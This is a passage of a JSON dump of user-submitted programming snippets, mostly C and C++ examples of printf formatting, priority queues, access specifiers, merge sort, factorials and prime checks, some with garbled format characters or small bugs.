    "keyword": null,
    "link": null,
    "title": " print the elements of the array without using the [] notation in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int arr[] = {2,4,8};     int size = sizeof(arr) / sizeof(arr[0]);      for (int i = 0; i < size; i++)     {         cout << *(arr + i) << \"  \"; // prints.. 2  4  8.     } }\n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3383,
    "keyword": null,
    "link": null,
    "title": " print to console c++",
    "description": "// Just some basic format   #include <iostream> #include <string> using namespace std;  int main() {  cout << \"Print a String\" << endl;  }\n// Include the library for console in-/outputs #include <iostream>  // Main function int main() {   // Actual output line   std::cout << \"Hello World!\" << std::endl; }\n/*there are 2 ways of doing it.*/ #include <iostream> // including the main thing needed int main(){   std::cout << \"Text here.\";   //you could put using namespace std; so you just have to do   cout << \"Text Here.\";   //this isnt reccomended though.   printf(\"hi\");   //is also an option.   return 0; }\n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3384,
    "keyword": null,
    "link": null,
    "title": " printf() in cpp",
    "description": "#include <cstdio> int printf( const char *format, ... ); cout<<printf; \n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3385,
    "keyword": null,
    "link": null,
    "title": " printf c",
    "description": "printf(\"%.6f\", myFloat);\n/* printf example */ #include <stdio.h>  int main() {    printf (\"Characters: %c %c \\n\", 'a', 65);    printf (\"Decimals: %d %ld\\n\", 1977, 650000L);    printf (\"Preceding with blanks: \u0010d \\n\", 1977);    printf (\"Preceding with zeros: \u00010d \\n\", 1977);    printf (\"Some different radices: %d %x %o %#x %#o \\n\", 100, 100, 100, 100, 100);    printf (\"floats: %4.2f %+.0e %E \\n\", 3.1416, 3.1416, 3.1416);    printf (\"Width trick: %*d \\n\", 5, 10);    printf (\"%s \\n\", \"A string\");    return 0; }\n#include <stdio.h>  int printf(const char *format, ...);  int main(void) {   int nb = 20;     printf(\"Hello World !\\n\");   printf(\"%d\\n\", nb);   printf(\"%s/%d\\n\", \"Nice\", 20);   return (0); }  /// output : /// ///\tHello World ! ///\t20 ///\tNice/20 ///\n/* printf example in C */ #include <stdio.h>  int main() {    printf (\"Characters: %c %c \\n\", 'a', 65);    printf (\"Decimals: %d %ld\\n\", 1977, 650000L);    printf (\"Preceding with blanks: \u0010d \\n\", 1977);    printf (\"Preceding with zeros: \u00010d \\n\", 1977);    printf (\"Some different radices: %d %x %o %#x %#o \\n\", 100, 100, 100, 100, 100);    printf (\"floats: %4.2f %+.0e %E \\n\", 3.1416, 3.1416, 3.1416);    printf (\"Width trick: %*d \\n\", 5, 10);    printf (\"%s \\n\", \"A string\");       return 0; }   //*******  Characters: a A Decimals: 1977 650000 Preceding with blanks:       1977 Preceding with zeros: 0000001977 Some different radices: 100 64 144 0x64 0144 floats: 3.14 +3e+000 3.141600E+000 Width trick:    10 A string\n#include <stdio.h>  int main () {    int ch;     for( ch = 75 ; ch <= 100; ch++ ) {       printf(\"ASCII value = %d, Character = %c\\n\", ch , ch );    }     return(0); }\n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3386,
    "keyword": null,
    "link": null,
    "title": " printf in c++",
    "description": "#include <cstdio>  int main() {     char ch = 'a';     float a = 5.0, b = 3.0;     int x = 10;      printf(\"%.3f / %.3f = %.3f \\n\", a,b,a/b);     printf(\"Setting width %*c \\n\",5,ch);     printf(\"Octal equivalent of %d is %o \\n\",x,x);      return 0; }\n/* printf example */ #include <stdio.h>  int main() {    printf (\"Characters: %c %c \\n\", 'a', 65);    printf (\"Decimals: %d %ld\\n\", 1977, 650000L);    printf (\"Preceding with blanks: \u0010d \\n\", 1977);    printf (\"Preceding with zeros: \u00010d \\n\", 1977);    printf (\"Some different radices: %d %x %o %#x %#o \\n\", 100, 100, 100, 100, 100);    printf (\"floats: %4.2f %+.0e %E \\n\", 3.1416, 3.1416, 3.1416);    printf (\"Width trick: %*d \\n\", 5, 10);    printf (\"%s \\n\", \"A string\");    return 0; }\n//can't print with printf, since string is a C++ class obj and print %s  //doesn't recognize //can do printf(\"%s\", str.c_str()) //converts string to c str (char array)      //or just use cout<<str;       //string assignment    str1=str2; //or str1.assign(str2) \n#include <cstdio> int printf( const char *format, ... ); cout<<printf; \n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3387,
    "keyword": null,
    "link": null,
    "title": " printf integer",
    "description": "/* printf example */ #include <stdio.h>  int main() {    printf (\"Characters: %c %c \\n\", 'a', 65);    printf (\"Decimals: %d %ld\\n\", 1977, 650000L);    printf (\"Preceding with blanks: \u0010d \\n\", 1977);    printf (\"Preceding with zeros: \u00010d \\n\", 1977);    printf (\"Some different radices: %d %x %o %#x %#o \\n\", 100, 100, 100, 100, 100);    printf (\"floats: %4.2f %+.0e %E \\n\", 3.1416, 3.1416, 3.1416);    printf (\"Width trick: %*d \\n\", 5, 10);    printf (\"%s \\n\", \"A string\");    return 0; }\nprintf(\"hello\");\n// Use %i or %d for a single decimal integer. // See https://www.cplusplus.com/reference/cstdio/printf/ printf(\"%i\\n\", x);\n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3388,
    "keyword": null,
    "link": null,
    "title": " printing an array backwards in c++",
    "description": "#include <iostream>   // Print contents of an array in reverse order in C++ // using array indices int main() {     int arr[] = { 10, 20, 30, 40 };     size_t n = sizeof(arr)/sizeof(arr[0]);       // iterate backwards over the elements of an array     for (int i = n - 1; i >= 0; i--) {         std::cout << arr[i] << ' ';     }       return 0; } \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3389,
    "keyword": null,
    "link": null,
    "title": " printing in column c++",
    "description": "#include <iostream> #include <iomanip> #include <string>  int main() {    std::string arr[]={\"2\",\"1\",\"3\",\"16\",\"8\",\"3\",\"4\",\"1\",\"2\"};    const int arrlength = sizeof(arr)/sizeof(*arr);    const int matrixSize = 3;     for(int row = 0; row < matrixSize; ++row)    {       for (int index = row; index < arrlength ; index += matrixSize)          std::cout << arr[index] << std::setw(5);       std::cout << \"\\n\";    }    return 0; } \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3390,
    "keyword": null,
    "link": null,
    "title": " prints all the keys and values in a map c++",
    "description": "for (auto x : m) { cout << x.first << \" \" << x.second << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3391,
    "keyword": null,
    "link": null,
    "title": " prints out the elements in the array c++",
    "description": "void printArray(int a[],int n){ \tfor(int i=0;i<n;i++)       cout<<a[i]<<\" \";   \tcout<<endl; }\nfor (auto i : a){ //C++11 \tcout << i<< \" \"; } \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3392,
    "keyword": null,
    "link": null,
    "title": " printstream deagle",
    "description": "Stop wasting your money on CSGO skins :)\n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3393,
    "keyword": null,
    "link": null,
    "title": " priority queue c++",
    "description": "#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \n/* A priority queue maintains a set of elements. The supported operations are insertion and, depending on the type of the queue, retrieval and removal  of either the minimum or maximum element. Insertion and removal take  O(logn) time, and retrieval takes O(1) time. */ priority_queue<int> q; q.push(3); // 3 q.push(5); // 3 5 q.push(7); // 3 5 7 q.push(2); // 2 3 5 7 cout << q.top() << \"\\n\"; // 7 q.pop(); cout << q.top() << \"\\n\"; // 5 q.pop(); q.push(6); cout << q.top() << \"\\n\"; // 6 q.pop();\n// Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n//Shubh'grepper // Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n// using GCC 10.2 (C++2a) compiler #include <functional> #include <queue> #include <vector> #include <iostream>   template<typename T> void print_queue(T& q) {     while(!q.empty()) {         std::cout << q.top() << \" \";         q.pop();     }     std::cout << '\\n'; }   int main() {     std::priority_queue<int> q;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       print_queue(q);       std::priority_queue<int, std::vector<int>, std::greater<int> > q2;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q2.push(n);       print_queue(q2);       // Using lambda to compare elements.     auto cmp = [](int left, int right) { return (left ^ 1) < (right ^ 1); };     std::priority_queue<int, std::vector<int>, decltype(cmp)> q3(cmp);       for(int n : {1,8,5,6,3,4,0,9,7,2})         q3.push(n);       print_queue(q3);   } \n#include<iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     priority_queue<int>pq;     int n=5;     while(n--)     {         int val;         cout<<\"enter the value you want to insert:\"<<endl;         cin>>val;         pq.push(val);     }     priority_queue<int>p;     p.push(100);     p.push(1000);     p.push(3000);     p.push(5000);     pq.swap(p);     while(!pq.empty())     {         cout<<pq.top()<<\" \";         pq.pop();     }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3394,
    "keyword": null,
    "link": null,
    "title": " priority queue c++ type of pairs",
    "description": "#include <bits/stdc++.h> using namespace std; typedef pair<int, int> pi; // main program int main() {    priority_queue<pi, vector<pi>, greater<pi> > pq;    pq.push(make_pair(10, 200));    pq.push(make_pair(20, 100));    pq.push(make_pair(15, 400));    pair<int, int> top = pq.top();    cout << top.first << \" \" << top.second;    return 0; }\n#include <bits/stdc++.h> using namespace std; // main program int main() {    priority_queue<pair<int, int> > priorityq;    priorityq.push(make_pair(18, 200));    priorityq.push(make_pair(29, 100));    priorityq.push(make_pair(11, 400));    pair<int, int> top = priorityq.top();    cout << top.first << \" \" << top.second;    return 0; }\n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3395,
    "keyword": null,
    "link": null,
    "title": " priority queue cpp",
    "description": "/* A priority queue maintains a set of elements. The supported operations are insertion and, depending on the type of the queue, retrieval and removal  of either the minimum or maximum element. Insertion and removal take  O(logn) time, and retrieval takes O(1) time. */ priority_queue<int> q; q.push(3); // 3 q.push(5); // 3 5 q.push(7); // 3 5 7 q.push(2); // 2 3 5 7 cout << q.top() << \"\\n\"; // 7 q.pop(); cout << q.top() << \"\\n\"; // 5 q.pop(); q.push(6); cout << q.top() << \"\\n\"; // 6 q.pop();\n// Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n//Shubh'grepper // Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n// using GCC 10.2 (C++2a) compiler #include <functional> #include <queue> #include <vector> #include <iostream>   template<typename T> void print_queue(T& q) {     while(!q.empty()) {         std::cout << q.top() << \" \";         q.pop();     }     std::cout << '\\n'; }   int main() {     std::priority_queue<int> q;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       print_queue(q);       std::priority_queue<int, std::vector<int>, std::greater<int> > q2;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q2.push(n);       print_queue(q2);       // Using lambda to compare elements.     auto cmp = [](int left, int right) { return (left ^ 1) < (right ^ 1); };     std::priority_queue<int, std::vector<int>, decltype(cmp)> q3(cmp);       for(int n : {1,8,5,6,3,4,0,9,7,2})         q3.push(n);       print_queue(q3);   } \n#include<iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     priority_queue<int>pq;     int n=5;     while(n--)     {         int val;         cout<<\"enter the value you want to insert:\"<<endl;         cin>>val;         pq.push(val);     }     priority_queue<int>p;     p.push(100);     p.push(1000);     p.push(3000);     p.push(5000);     pq.swap(p);     while(!pq.empty())     {         cout<<pq.top()<<\" \";         pq.pop();     }     return 0; } \n/* Program to access an element of highest priority */   #include<iostream> #include<queue>     //Header-file for queue using namespace std;     int main() { priority_queue<int> p1; p1.push(35);     p1.push(40); p1.push(95); p1.push(25);    cout<<p1.top();      //fetch element of highest priority(maximum element) i.e 95 } \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3396,
    "keyword": null,
    "link": null,
    "title": " priority queue descending order c++",
    "description": "// using GCC 10.2 (C++2a) compiler #include <functional> #include <queue> #include <vector> #include <iostream>   template<typename T> void print_queue(T& q) {     while(!q.empty()) {         std::cout << q.top() << \" \";         q.pop();     }     std::cout << '\\n'; }   int main() {     std::priority_queue<int> q;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       print_queue(q);       std::priority_queue<int, std::vector<int>, std::greater<int> > q2;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q2.push(n);       print_queue(q2);       // Using lambda to compare elements.     auto cmp = [](int left, int right) { return (left ^ 1) < (right ^ 1); };     std::priority_queue<int, std::vector<int>, decltype(cmp)> q3(cmp);       for(int n : {1,8,5,6,3,4,0,9,7,2})         q3.push(n);       print_queue(q3);   } \nThe priority queue gquiz is :     30    20    10    5    1  gquiz.size() : 5 gquiz.top() : 30 gquiz.pop() :     20    10    5    1 \n",
    "reg_date": "2021-10-12T11:42:44.000Z"
  },
  {
    "id": 3397,
    "keyword": null,
    "link": null,
    "title": " priority queue in c++",
    "description": "/* A priority queue maintains a set of elements. The supported operations are insertion and, depending on the type of the queue, retrieval and removal  of either the minimum or maximum element. Insertion and removal take  O(logn) time, and retrieval takes O(1) time. */ priority_queue<int> q; q.push(3); // 3 q.push(5); // 3 5 q.push(7); // 3 5 7 q.push(2); // 2 3 5 7 cout << q.top() << \"\\n\"; // 7 q.pop(); cout << q.top() << \"\\n\"; // 5 q.pop(); q.push(6); cout << q.top() << \"\\n\"; // 6 q.pop();\n// Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n//Shubh'grepper // Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n// using GCC 10.2 (C++2a) compiler #include <functional> #include <queue> #include <vector> #include <iostream>   template<typename T> void print_queue(T& q) {     while(!q.empty()) {         std::cout << q.top() << \" \";         q.pop();     }     std::cout << '\\n'; }   int main() {     std::priority_queue<int> q;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       print_queue(q);       std::priority_queue<int, std::vector<int>, std::greater<int> > q2;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q2.push(n);       print_queue(q2);       // Using lambda to compare elements.     auto cmp = [](int left, int right) { return (left ^ 1) < (right ^ 1); };     std::priority_queue<int, std::vector<int>, decltype(cmp)> q3(cmp);       for(int n : {1,8,5,6,3,4,0,9,7,2})         q3.push(n);       print_queue(q3);   } \n#include<iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     priority_queue<int>pq;     int n=5;     while(n--)     {         int val;         cout<<\"enter the value you want to insert:\"<<endl;         cin>>val;         pq.push(val);     }     priority_queue<int>p;     p.push(100);     p.push(1000);     p.push(3000);     p.push(5000);     pq.swap(p);     while(!pq.empty())     {         cout<<pq.top()<<\" \";         pq.pop();     }     return 0; } \n/* Program to access an element of highest priority */   #include<iostream> #include<queue>     //Header-file for queue using namespace std;     int main() { priority_queue<int> p1; p1.push(35);     p1.push(40); p1.push(95); p1.push(25);    cout<<p1.top();      //fetch element of highest priority(maximum element) i.e 95 } \n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3398,
    "keyword": null,
    "link": null,
    "title": " priority queue ordered by second element",
    "description": "#include <bits/stdc++.h> using namespace std;  typedef pair<string, int> Max; struct Compare {     bool operator()(Max a, Max b) {         return a.second < b.second;     } };  int main() {     //Max heap custom data type     priority_queue<Max, vector<Max>, Compare> p;     p.push(make_pair(\"a\", 1));     p.push(make_pair(\"c\", 1));     p.push(make_pair(\"b\", 3));      while (!p.empty()) {         Max top = p.top();         cout << top.first << \" => \" << top.second << \"\\n\";         p.pop();     }     /*     * OUTPUT:     * b = 3     * a = 1     * c = 1     */ }\n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3399,
    "keyword": null,
    "link": null,
    "title": " priority queue stl",
    "description": "/* A priority queue maintains a set of elements. The supported operations are insertion and, depending on the type of the queue, retrieval and removal  of either the minimum or maximum element. Insertion and removal take  O(logn) time, and retrieval takes O(1) time. */ priority_queue<int> q; q.push(3); // 3 q.push(5); // 3 5 q.push(7); // 3 5 7 q.push(2); // 2 3 5 7 cout << q.top() << \"\\n\"; // 7 q.pop(); cout << q.top() << \"\\n\"; // 5 q.pop(); q.push(6); cout << q.top() << \"\\n\"; // 6 q.pop();\n//Shubh'grepper // Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n// using GCC 10.2 (C++2a) compiler #include <functional> #include <queue> #include <vector> #include <iostream>   template<typename T> void print_queue(T& q) {     while(!q.empty()) {         std::cout << q.top() << \" \";         q.pop();     }     std::cout << '\\n'; }   int main() {     std::priority_queue<int> q;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       print_queue(q);       std::priority_queue<int, std::vector<int>, std::greater<int> > q2;       for(int n : {1,8,5,6,3,4,0,9,7,2})         q2.push(n);       print_queue(q2);       // Using lambda to compare elements.     auto cmp = [](int left, int right) { return (left ^ 1) < (right ^ 1); };     std::priority_queue<int, std::vector<int>, decltype(cmp)> q3(cmp);       for(int n : {1,8,5,6,3,4,0,9,7,2})         q3.push(n);       print_queue(q3);   } \n#include<iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     priority_queue<int>pq;     int n=5;     while(n--)     {         int val;         cout<<\"enter the value you want to insert:\"<<endl;         cin>>val;         pq.push(val);     }     priority_queue<int>p;     p.push(100);     p.push(1000);     p.push(3000);     p.push(5000);     pq.swap(p);     while(!pq.empty())     {         cout<<pq.top()<<\" \";         pq.pop();     }     return 0; } \nstd::priority_queue<int, std::vector<int>, std::greater<int>>\nfunction PriorityQueue() {   this.collection = [];   this.printCollection = function () {     console.log(this.collection);   };   // Only change code below this line   this.enqueue = function (newitem) {     if (this.isEmpty()) {       return this.collection.push(newitem);     }      this.collection = this.collection.reverse();     var found_index = this.collection.findIndex(function (item) {       return newitem[1] >= item[1];     });     if (found_index === -1) {       this.collection.push(newitem);     } else {       this.collection.splice(found_index, 0, newitem);     }     this.collection = this.collection.reverse();   };   this.dequeue = function () {     if (!this.isEmpty()) {       return this.collection.shift()[0];     } else {       return \"The queue is empty.\";     }   };   this.size = function () {     return this.collection.length;   };   this.front = function () {     return this.collection[0][0];   };   this.isEmpty = function () {     return this.size() > 0 ? false : true;   };   // Only change code above this line } \n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3400,
    "keyword": null,
    "link": null,
    "title": " private  in c++",
    "description": "#include <iostream> // Visibility is how visible certain members or methods of class are , who can see them ,who can call them and who can use them //Visibility has no effect on performance of your program it is ust for organizing code //Three basic visibility modifers are: //1 private //2 public //3 protected //default visibility of a struct is public //default visibility of class is private  class Entity { protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes \tint P; \tvoid InitP () { \t\tP = 0; \t\t//initializes P to 0 \t} public://Pubic methods and variables can be accessed inside and outside of the class \tint a, b; \tvoid Init() { \t\ta = 0; \t\tb = 0; \t} private://only entity class can read and write the variables exeption is friend \tint X , Y; \tvoid print(){ \t\t// Content \t\t// only this function can be acessed inside the class unless you use friend keyword \t} public: \tEntity() { \t\tX = 0;// can initialize x inside the class but can't access it from outside the class unsless you use friend keyword  \t}  }; class Player : public Entity// class palyer is a sub class of  class Entity { public: \tPlayer() { \t\t//X = 2;\t// Error can't access the private members from base class \t\t//print();\t// can't access it in sub class because it is private  \t\ta = 1;\t// can acces it because it is public in base class \t\tb = 1;\t// can acces it because it is public in base class \t\tInit(); // can acces it because it is public in base class \t\tP = 0;\t// can access it in subclass because its visibility is protected \t\tInitP(); //can access it in subclass because its visibility is protected \t} \t  }; int main() { \tEntity e1; \tPlayer a; \t//e1.x;\t//error can't access private members from here \t//e1.print(); // error inaccessible due to its visibility being private \te1.a = 5;//can access from here because it's visibility is public  \te1.Init();//can access from here because it's visibility is public \ta.a = 5;//can access from here because it's visibility in base class is public  \ta.Init();//can access from here because it's visibility in base class is public \t//e1.P;\t//can't access it because  visibility is protected \t//e1.InitP; //can't access it because  visibility is protected \t// a.P;\t\t//can't access it because  visibility is protected in base class \t// a.InitP; //can't access it because  visibility is protected in base class \tstd::cin.get();\n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3401,
    "keyword": null,
    "link": null,
    "title": " private and protected in c++",
    "description": "protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes public://Pubic methods and variables can be accessed inside and outside of the class private://only entity class can read and write the variables exeption is friend\nclass A  { public:     int x; protected:     int y; private:     int z; };   class B : public A {     // x is public     // y is protected     // z is not accessible from B };   class C : protected A {     // x is protected     // y is protected     // z is not accessible from C };   class D : private A    // 'private' is default for classes {     // x is private     // y is private     // z is not accessible from D };\n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3402,
    "keyword": null,
    "link": null,
    "title": " private and public in namespace cpp",
    "description": "#include <cstdio> #include \"thing.hpp\"  int main(int argc, char **argv) {     printf(\"%d\\n\", thing::getX());     // OK     printf(\"%d\\n\", thing::getSum());   // OK     printf(\"%d\\n\", thing::sum(1, 2));  // error: &lsquo;sum&lsquo; is not a member of &lsquo;thing&rsquo;         printf(\"%d\\n\", thing::y);          // error: &lsquo;y&lsquo; is not a member of &lsquo;thing&rsquo;     } \n// thing.cpp  namespace thing {     namespace   // anonymous namespace     {         int x = 1;         int y = 2;          int sum(int a, int b)         {             return a + b;         }     }      int getX()      {         return x;     }      int getSum()     {         return sum(x, y);     } }; \n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3403,
    "keyword": null,
    "link": null,
    "title": " probability code c++",
    "description": "// this the c++ code for generating random numbers //pdf(x) = 1 if x>360 //       = 0 if x<0 //       = x/360 otherwise #include <iostream> #include <math.h> #include <stdlib.h>   using namespace std;   //This is a sample program to generate a random numbers based on probability desity function of spiner //pdf(x) = 1 if x>360 //       = 0 if x<0 //       = x/360 otherwise int N = 10; int main(int argc, char **argv) {     int p = 0;     for (int i = 0; i < N; i++)     {         p = rand() % 400;         if (p > 360)             cout << 0 << \" \";         else if (p < 0)             cout << 0 << \" \";         else             cout << p * 0.1 / 360 << \" \";     }     cout << \"...\"; }\n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3404,
    "keyword": null,
    "link": null,
    "title": " program to calculate Fibonacci of 100 in C++",
    "description": "#include <iostream> #include <bigint/BigIntegerLibrary.hh> using namespace std;  int main() {   BigInteger start = 0;   BigInteger next = 1;   BigInteger _new;      for (int r = 1; r < 1000; r++)   {     _new = next + start;         start = next;     next = _new;   }      cout << next << endl; }\n",
    "reg_date": "2021-10-12T11:42:45.000Z"
  },
  {
    "id": 3405,
    "keyword": null,
    "link": null,
    "title": " program to calculate factorial of number in c++",
    "description": "#include<bits/stdc++.h> #include<stdio.h> using namespace std;  int fact(int i){ \tif (i <= 1) return 1;   \telse return i*fact(i-1); }  int main(){   \tios::sync_with_stdio(0);   \tcin.tie(0);   \tint N;   \tcin >> N;   \tcout << fact(N) << \"\\n\";   \treturn 0; }\n#include <iostream> using namespace std;  int main() {     unsigned int n;     unsigned long long factorial = 1;      cout << \"Enter a positive integer: \";     cin >> n;      for(int i = 1; i <=n; ++i)     {         factorial *= i;     }      cout << \"Factorial of \" << n << \" = \" << factorial;         return 0; }\n#include <cmath>  int fact(int n){     return std::tgamma(n + 1);   }     // for n = 5 -> 5 * 4 * 3 * 2 = 120  //tgamma performas factorial with n - 1 -> hence we use n + 1\n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3406,
    "keyword": null,
    "link": null,
    "title": " program to check  smallest num in three numbers in c++",
    "description": "#include <iostream> using namespace std;  int main() {       int a, b, c;       cout << \"Enter three numbers \\n\";      /* Taking input */     cin >> a >> b >> c;       /* If a is smaller than b and c. */      if (a < b && a < c) {         cout << \"Smallest number is \" << a;        /* If b is smaller than a and c */     } else if (b < a && b < c)  {        cout << \"Smallest number is \" << b;      } else {       cout << \"Smallest number is \"<< c;       }         return 0; } \n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3407,
    "keyword": null,
    "link": null,
    "title": " program to convert int to int array c++",
    "description": "#include <iostream> #include <vector> using namespace std;  vector <int> integerToArray(int x) {     vector <int> resultArray;     while (true)     {     resultArray.insert(resultArray.begin(), x\u0010);     x /= 10;     if(x == 0)         return resultArray;     } }  int main() {     vector <int> temp = integerToArray(1234567);     for (auto const &element : temp)         cout << element << \" \" ;     return 0; }  //outputs 1 2 3 4 5 6 7  \n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3408,
    "keyword": null,
    "link": null,
    "title": " program to implement merge sort in c++",
    "description": "#include <iostream> using namespace std;    void merge(int arr[], int l, int m, int r) {     int n1 = m - l + 1;     int n2 = r - m;         int L[n1], R[n2];           for (int i = 0; i < n1; i++)         L[i] = arr[l + i];     for (int j = 0; j < n2; j++)         R[j] = arr[m + 1 + j];        int i = 0;            int j = 0;            int k = l;       while (i < n1 && j < n2) {         if (L[i] <= R[j]) {             arr[k] = L[i];             i++;         }         else {             arr[k] = R[j];             j++;         }         k++;     }          while (i < n1) {         arr[k] = L[i];         i++;         k++;     }           while (j < n2) {         arr[k] = R[j];         j++;         k++;     } }    void mergeSort(int arr[],int l,int r){     if(l>=r){         return;     }     int m = (l+r-1)/2;     mergeSort(arr,l,m);     mergeSort(arr,m+1,r);     merge(arr,l,m,r); }    void printArray(int A[], int size) {     for (int i = 0; i < size; i++)         cout << A[i] << \" \"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int arr_size = sizeof(arr) / sizeof(arr[0]);       cout << \"Given array is \\n\";     printArray(arr, arr_size);       mergeSort(arr, 0, arr_size - 1);       cout << \"\\nSorted array is \\n\";     printArray(arr, arr_size);     return 0; }\n#include<iostream> using namespace std; void swapping(int &a, int &b) {     //swap the content of a and b    int temp;    temp = a;    a = b;    b = temp; } void display(int *array, int size) {    for(int i = 0; i<size; i++)       cout << array[i] << \" \";    cout << endl; } void merge(int *array, int l, int m, int r) {    int i, j, k, nl, nr;    //size of left and right sub-arrays    nl = m-l+1; nr = r-m;    int larr[nl], rarr[nr];    //fill left and right sub-arrays    for(i = 0; i<nl; i++)       larr[i] = array[l+i];    for(j = 0; j<nr; j++)       rarr[j] = array[m+1+j];    i = 0; j = 0; k = l;    //marge temp arrays to real array    while(i < nl && j<nr) {       if(larr[i] <= rarr[j]) {          array[k] = larr[i];          i++;       }else{          array[k] = rarr[j];          j++;       }       k++;    }    while(i<nl) {       //extra element in left array       array[k] = larr[i];       i++; k++;    }    while(j<nr) {     //extra element in right array       array[k] = rarr[j];       j++; k++;    } } void mergeSort(int *array, int l, int r) {    int m;    if(l < r) {       int m = l+(r-l)/2;       // Sort first and second arrays       mergeSort(array, l, m);       mergeSort(array, m+1, r);       merge(array, l, m, r);    } } int main() {    int n;    cout << \"Enter the number of elements: \";    cin >> n;    int arr[n];     //create an array with given number of elements    cout << \"Enter elements:\" << endl;    for(int i = 0; i<n; i++) {       cin >> arr[i];    }    cout << \"Array before Sorting: \";    display(arr, n);    mergeSort(arr, 0, n-1);     //(n-1) for last index    cout << \"Array after Sorting: \";    display(arr, n); }\n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3409,
    "keyword": null,
    "link": null,
    "title": " program to know if a number is prime",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\n",
    "reg_date": "2021-10-12T11:42:46.000Z"
  },
  {
    "id": 3410,
    "keyword": null,
    "link": null,
    "title": " program to swap max and min in matrix",
